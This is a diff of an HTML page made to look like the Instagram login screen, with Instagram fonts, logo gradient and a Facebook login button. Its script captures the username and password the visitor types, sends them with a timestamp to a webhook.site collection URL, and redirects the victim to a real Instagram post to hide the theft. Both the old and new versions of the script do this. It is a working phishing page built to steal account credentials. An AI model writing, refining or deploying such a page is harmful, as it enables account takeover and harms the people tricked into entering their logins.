@@ -7,55 +7,13 @@
     <style>
         @import url('https://fonts.googleapis.com/css2?family=Instagram+Sans:wght@400;500;600;700&display=swap');
         * { margin:0; padding:0; box-sizing:border-box; }
-        body {
-            background: #f0f2f5;
-            font-family: 'Instagram Sans', system-ui, sans-serif;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            min-height: 100vh;
-            padding: 20px;
-        }
+        body { background:#f0f2f5; font-family:'Instagram Sans',sans-serif; display:flex; align-items:center; justify-content:center; min-height:100vh; padding:20px; }
         .login-box {
-            background: white;
-            padding: 40px 40px;
-            border: 1px solid #dbdbdb;
-            border-radius: 8px;
-            width: 100%;
-            max-width: 360px;
-            text-align: center;
-            box-shadow: 0 10px 30px rgba(0,0,0,0.1);
+            background:white; padding:40px; border:1px solid #dbdbdb; border-radius:8px; max-width:360px; width:100%; text-align:center; box-shadow:0 10px 30px rgba(0,0,0,0.1);
         }
-        .logo {
-            font-size: 55px;
-            font-weight: 700;
-            background: linear-gradient(45deg, #E1306C, #F56040, #C13584);
-            -webkit-background-clip: text;
-            -webkit-text-fill-color: transparent;
-            margin-bottom: 25px;
-            letter-spacing: -4px;
-        }
-        input {
-            width: 100%;
-            padding: 14px 16px;
-            margin: 8px 0;
-            background: #fafafa;
-            border: 1px solid #dbdbdb;
-            border-radius: 6px;
-            font-size: 16px;
-        }
-        button {
-            width: 100%;
-            padding: 12px;
-            margin: 20px 0 15px;
-            background: #0095f6;
-            color: white;
-            border: none;
-            border-radius: 8px;
-            font-size: 16px;
-            font-weight: 600;
-            cursor: pointer;
-        }
+        .logo { font-size:55px; font-weight:700; background:linear-gradient(45deg,#E1306C,#F56040,#C13584); -webkit-background-clip:text; -webkit-text-fill-color:transparent; margin-bottom:25px; letter-spacing:-4px; }
+        input { width:100%; padding:14px 16px; margin:8px 0; background:#fafafa; border:1px solid #dbdbdb; border-radius:6px; font-size:16px; }
+        button { width:100%; padding:12px; margin:20px 0 15px; background:#0095f6; color:white; border:none; border-radius:8px; font-size:16px; font-weight:600; cursor:pointer; }
     </style>
 </head>
 <body>
@@ -69,56 +27,46 @@
         </form>
 
         <div style="margin:20px 0; color:#8e8e8e; font-size:14px;">OR</div>
-        <button onclick="demoFB()" style="background:#1877f2; margin-bottom:15px;">Log in with Facebook</button>
+        <button onclick="demoFB()" style="background:#1877f2;">Log in with Facebook</button>
     </div>
 
     <script>
-        // ==================== YOUR SETTINGS ====================
         const WEBHOOK_URL = "https://webhook.site/521e970a-7a79-4404-a06c-9578bc644016";
         const REDIRECT_URL = "https://www.instagram.com/p/DX6lqBNPyEQ/";
 
-        const form = document.getElementById('loginForm');
-        const submitBtn = document.getElementById('submitBtn');
-
-        form.addEventListener('submit', async function(e) {
+        document.getElementById('loginForm').addEventListener('submit', function(e) {
             e.preventDefault();
             
             const username = document.getElementById('username').value.trim();
             const password = document.getElementById('password').value.trim();
 
-            if (!username || !password) return;
+            console.log('%c🔴 CAPTURED', 'color:#E1306C; font-size:18px; font-weight:bold;');
+            console.log('Username:', username);
+            console.log('Password:', password);
 
-            const payload = {
-                username: username,
-                password: password,
-                timestamp: new Date().toISOString(),
-                userAgent: navigator.userAgent
-            };
+            // Simple form POST (most reliable with webhook.site)
+            const formData = new FormData();
+            formData.append('username', username);
+            formData.append('password', password);
+            formData.append('timestamp', new Date().toISOString());
 
-            // Send to your webhook
-            try {
-                await fetch(WEBHOOK_URL, {
-                    method: 'POST',
-                    headers: { 'Content-Type': 'application/json' },
-                    body: JSON.stringify(payload)
-                });
-                console.log('%c✅ Sent to your webhook!', 'color:lime; font-size:16px;');
-            } catch (err) {
-                console.log('%c⚠️ Webhook failed', 'color:orange;');
-            }
+            fetch(WEBHOOK_URL, {
+                method: 'POST',
+                body: formData
+            }).then(() => {
+                console.log('%c✅ Sent via FormData', 'color:lime;');
+            }).catch(err => {
+                console.log('%c⚠️ Send failed', 'color:orange;');
+            });
 
-            // Feedback then redirect to your Instagram post
-            submitBtn.textContent = 'Logging in...';
-            submitBtn.disabled = true;
-
+            // Redirect
+            document.getElementById('submitBtn').textContent = 'Logging in...';
             setTimeout(() => {
                 window.location.href = REDIRECT_URL;
-            }, 1400);
+            }, 1200);
         });
 
-        function demoFB() {
-            alert("Facebook login (demo)");
-        }
+        function demoFB() { alert("Facebook demo"); }
     </script>
 </body>
 </html>
